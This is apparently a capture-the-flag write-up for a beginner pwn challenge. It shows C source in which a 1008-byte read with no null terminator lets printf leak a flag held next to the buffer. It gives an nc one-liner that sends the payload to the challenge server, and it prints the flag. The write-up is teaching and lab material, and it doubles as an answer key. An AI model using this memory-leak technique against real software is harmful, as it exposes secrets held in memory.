# Introspection 

Solved by: @OS1RIS

## Question:

Know your inner self and get started with Pwn.

## Solution: 

1. View introspection.c source code

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>


int main()
{
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    printf("\033[32m\"Introspection is the key to unlocking your fullest potential; knowing yourself is the first step.\"\033[0m\n\n");
    printf("                                                                                         - ChatGPT\n");
    printf("Have you thought about what you really wanted in life?\n");
    char flag[50];
    FILE *file = fopen("flag.txt", "r");
    if (file == NULL) 
    {
        printf("Error! flag.txt not found!");
        exit(1);
    }
    fread(flag, 1, 50, file);
    char buf[1008];
    printf(">> ");
    read(0, buf, 1008);
    printf("I wish for you that you get %s", buf);
}
```
The program reads user input into character buffer char buf[1008] using the read(0, buf, 1008) function. Since it allows 1008 bytes of input, we can send a payload exactly 1008 bytes long with a any single letters

2. Craft payload with exactly 1008 bytes
```py
python -c 'print(b"A"*1008)' | nc pwn.1nf1n1ty.team 31698
```

**Flag:** `ironCTF{W0w!_Y0u_Just_OverWrite_the_Nul1!}`


